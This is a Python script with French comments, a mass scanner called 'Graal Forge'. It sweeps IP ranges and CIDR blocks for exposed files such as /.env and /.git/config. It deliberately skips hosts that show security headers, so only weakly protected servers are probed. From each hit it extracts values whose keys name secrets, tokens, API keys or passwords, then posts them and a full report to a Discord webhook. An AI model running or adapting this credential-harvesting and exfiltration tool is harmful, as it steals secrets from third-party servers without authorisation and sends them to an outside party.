#!/usr/bin/env python3
import os, shutil, ipaddress, configparser, argparse, queue, threading, re, requests, glob
from urllib.parse import urljoin

# ─── CLI & FLAGS ────────────────────────────────────────────────────────
parser = argparse.ArgumentParser(description="Graal Forge CLI v3.10")
grp = parser.add_mutually_exclusive_group(required=True)
grp.add_argument("--mass", action="store_true")
grp.add_argument("--cidr", action="store_true")
grp.add_argument("--single", metavar="IP")
parser.add_argument("-r","--range", help="[mass] CIDR ou start-end")
args = parser.parse_args()

# ─── CONFIG ─────────────────────────────────────────────────────────────
cfg_file = ("config.single" if args.single
            else "config.mass"  if args.mass
            else "config.cidr")
cfg = configparser.ConfigParser(); cfg.read(cfg_file)
C = cfg["settings"]

WORDLIST    = C.get("wordlist_file")
PORTS       = [int(p) for p in C.get("ports","").split(",") if p]
THREADS     = C.getint("threads",20)
TIMEOUT     = C.getint("timeout",5)
WEBHOOK_URL = C.get("discord_webhook_url","").strip()

PROBE_PATHS = ["/.env","/phpinfo.php","/server-status","/admin","/.git/config"]
KEY_PAT     = re.compile(r"(?mi)^([A-Za-z0-9_]+)=(.+)$")

REPORT_DIR  = "rapport_discord"
os.makedirs(REPORT_DIR, exist_ok=True)

# ─── PRÉPARATION CIBLES & OUTPUT_DIR ───────────────────────────────────
if args.single:
    ip = args.single
    scan_name  = f"Chirurgical scan {ip}"
    OUTPUT_DIR = C.get("output_dir")  # doit valoir "output_single"
    targets    = [f"{'https' if p==443 else 'http'}://{ip}" +
                  ("" if p in (80,443) else f":{p}") for p in PORTS]
    num_hosts  = 1

elif args.mass:
    scan_name  = "Mass scan"
    base_dir   = C.get("output_dir")
    os.makedirs(base_dir, exist_ok=True)
    safe       = args.range.replace("/", "_").replace("-", "_") if args.range else None
    OUTPUT_DIR = f"{base_dir}_{safe}" if safe else base_dir
    with open(C.get("mass_ips_file")) as f:
        ips = [l.strip() for l in f if l.strip()]
    num_hosts  = len(ips)
    targets    = []
    for ip in ips:
        for p in PORTS:
            scheme = "https" if p==443 else "http"
            targets.append(f"{scheme}://{ip}" + ("" if p in (80,443) else f":{p}"))

else:
    CIDR       = C.get("cidr")
    scan_name  = f"CIDR scan {CIDR}"
    OUTPUT_DIR = C.get("output_dir")
    net        = ipaddress.IPv4Network(CIDR)
    num_hosts  = net.num_addresses - (2 if net.prefixlen<31 else 0)
    targets    = []
    for ip in net.hosts():
        for p in PORTS:
            scheme = "https" if p==443 else "http"
            targets.append(f"{scheme}://{ip}" + ("" if p in (80,443) else f":{p}"))

os.makedirs(OUTPUT_DIR, exist_ok=True)
requests.packages.urllib3.disable_warnings()

# mapping host → [clé=valeur,...] (pour le report.md)
secrets_by_host = {}

# ─── HELPERS ─────────────────────────────────────────────────────────────
def alert_discord(msg):
    if not WEBHOOK_URL: return
    requests.post(WEBHOOK_URL, json={"content":msg}, timeout=5)

def detect_defense(base):
    seen = False
    ok_hdr = True
    ok_uni = True
    for p in PROBE_PATHS:
        try:
            r = requests.get(urljoin(base,p), timeout=TIMEOUT, verify=False)
            seen = True
            hdrs, st = r.headers, r.status_code
            if not all(h in hdrs for h in ("Content-Security-Policy","Strict-Transport-Security")):
                ok_hdr = False
            if st not in (403,404):
                ok_uni = False
        except:
            pass
    if not seen:                  return None, "⚠️ Injoignable"
    if not ok_hdr and not ok_uni: return True,  "🟢 Sécurité FAIBLE, scan"
    if ok_hdr or ok_uni:         return False, "🟠 Sécurité MOYENNE, skip"
    return False,                  "🔴 Sécurité ÉLEVÉE, skip"

def worker(q):
    while not q.empty():
        base = q.get()
        ok, desc = detect_defense(base)
        if not ok:
            q.task_done()
            continue

        for path in map(str.strip, open(WORDLIST)):
            if not path:
                continue
            url = urljoin(base, path)
            try:
                r = requests.get(url, timeout=TIMEOUT, verify=False)
                if r.status_code == 200:
                    found = []
                    for m in KEY_PAT.finditer(r.text):
                        key, val = m.group(1), m.group(2).strip()
                        if re.search(r"(?i)(secret|token|apikey|password)", key):
                            found.append(f"{key}={val}")
                    if found:
                        secrets_by_host.setdefault(url, []).extend(found)
                        # print per-path secret line:
                        print(f"🎉 SECRET TROUVE ICI : {url} → {', '.join(found)}")
            except:
                pass
        q.task_done()

# ─── MAIN ───────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print(f"🌐 {scan_name} — {num_hosts} IP(s) → {len(targets)} vérifs → output: '{OUTPUT_DIR}/'")

    q = queue.Queue()
    for t in targets:
        q.put(t)
    for _ in range(min(THREADS, len(targets))):
        threading.Thread(target=worker, args=(q,), daemon=True).start()
    q.join()

    # Génération du report.md
    rpt = os.path.join(OUTPUT_DIR, "report.md")
    total_secrets = sum(len(v) for v in secrets_by_host.values())
    with open(rpt, "w") as f:
        f.write(f"# Rapport de **{scan_name}**\n")
        f.write(f"- **IP scannées**      : {num_hosts}\n")
        f.write(f"- **Vérifications**    : {len(targets)}\n")
        f.write(f"- **Secrets détectés** : {total_secrets}\n\n")
        f.write("## Détails par hôte\n")
        if total_secrets:
            for url, lst in secrets_by_host.items():
                f.write(f"- `{url}` : {', '.join(lst)}\n")
        else:
            f.write("☠️ Aucuns secrets trouvés.\n")

    # Discord notification
    if total_secrets:
        lines = [f"🚨 [{scan_name}] {total_secrets} secret(s) détecté(s) :"]
        for url, lst in secrets_by_host.items():
            lines.append(f"🎉 SECRET TROUVE ICI : {url} → {', '.join(lst)}")
        alert_discord("\n".join(lines))
    else:
        alert_discord(f"🚨 [{scan_name}] 0 secret(s) détecté(s) :\n☠️ Aucuns secrets trouvés")

    # Send report.md directly (plus de zip)
    if WEBHOOK_URL:
        with open(rpt, 'rb') as f:
            files = {'file': (os.path.basename(rpt), f)}
            requests.post(WEBHOOK_URL,
                          data={"content":f"📂 [{scan_name}] Rapport complet"},
                          files=files,
                          timeout=30)

    # Final console log
    print(f"🎉 {scan_name} terminé. Report: '{rpt}'")
    print(f"[✅] Scan terminé ! Consulte tes logs dans '{cfg_file}'.")
